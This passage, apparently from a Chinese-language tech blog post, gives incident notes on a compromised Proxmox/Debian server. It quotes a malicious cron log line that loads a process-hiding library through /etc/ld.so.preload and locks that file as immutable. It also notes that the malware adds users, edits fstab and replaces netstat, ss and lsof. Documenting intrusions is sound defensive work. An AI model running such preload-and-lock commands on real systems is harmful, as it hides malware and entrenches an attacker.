+</span></span><span class="line"><span class="cl">Jul  7 06:25:01 pve CRON[21291]: (root) CMD ( echo /usr/local/lib/libprocesshider.so &gt; /etc/ld.so.preload &amp;&amp; lockr +i /etc/ld.so.preload &gt;/dev/null 2&gt;&amp;1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>比較特別的是，他會去修改 /etc/fstab 載入一個 swapfile</p>
+<p>WTF！？ 沒事載入自己的 fstab 做啥？？</p>
+<p>然後還會在系統建立user 可以看一下 /etc/passwd , /etc/group , /etc/gshadow 這些檔案檢查</p>
+<p>手邊最好有另一臺乾淨的同樣作業系統的機器</p>
+<p>因為有很多系統指令已經被替換掉(netstat/ss/lsof 等等)</p>
+<p>需要從乾淨的系統弄過來，或者是重新從apt 安裝回來</p>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/debian/">debian</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相關文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%8F%88%E5%8F%88%E5%8F%88%E5%8F%88%E9%87%8D%E5%BC%84%E4%BA%86%E4%B8%80%E6%AC%A1%E9%83%A8%E8%90%BD%E6%A0%BC-/-restore-blog-again/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://h.cowbay.org/images/post-default-2.jpg" loading="lazy" data-key="" data-hash="https://h.cowbay.org/images/post-default-2.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">又又又又重弄了一次部落格 / Restore Blog Again</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%AD%86%E8%A8%98-phicomm-%E6%96%90%E8%A8%8A-n1-%E6%95%91%E7%A3%9A%E7%9A%84%E6%96%B9%E6%B3%95/-how-to-save-bricked-n1-router/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://h.cowbay.org/images/post-default-14.jpg" loading="lazy" data-key="" data-hash="https://h.cowbay.org/images/post-default-14.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[筆記] Phicomm 斐訊 N1 救磚的方法/ How to Save Bricked N1 Router</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/init-script-in-openwrt-to-start-leproxy/%E5%9C%A8openwrt-%E6%96%B0%E5%A2%9E%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95leproxy%E7%9A%84script/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://h.cowbay.org/images/post-default-17.jpg" loading="lazy" data-key="" data-hash="https://h.cowbay.org/images/post-default-17.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Init Script in Openwrt to Start Leproxy/在openwrt 新增自動啟動leproxy的script</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/auto-fetch-wildcard-ssl-certs-with-lego--acme-dns-domain-register-namecheap/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://h.cowbay.org/images/post-default-8.jpg" loading="lazy" data-key="" data-hash="https://h.cowbay.org/images/post-default-8.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">auto fetch  Wildcard ssl certs with lego &#43; acme-dns ( Domain Register : Namecheap)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%AD%86%E8%A8%98-web-%E6%AA%94%E6%A1%88%E7%AE%A1%E7%90%86-cloudcmd-web-file-manager/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://h.cowbay.org/images/post-default-2.jpg" loading="lazy" data-key="" data-hash="https://h.cowbay.org/images/post-default-2.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[筆記] WEB 檔案管理 Cloudcmd Web File Manager</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "h-cowbay-org" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 MCの部落
+    </section>
+    
+    <section class="powerby">
+        
+            鮮衣怒馬少年時 不負韶華行且知 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 建立 <br />
+        主題 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 設計
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
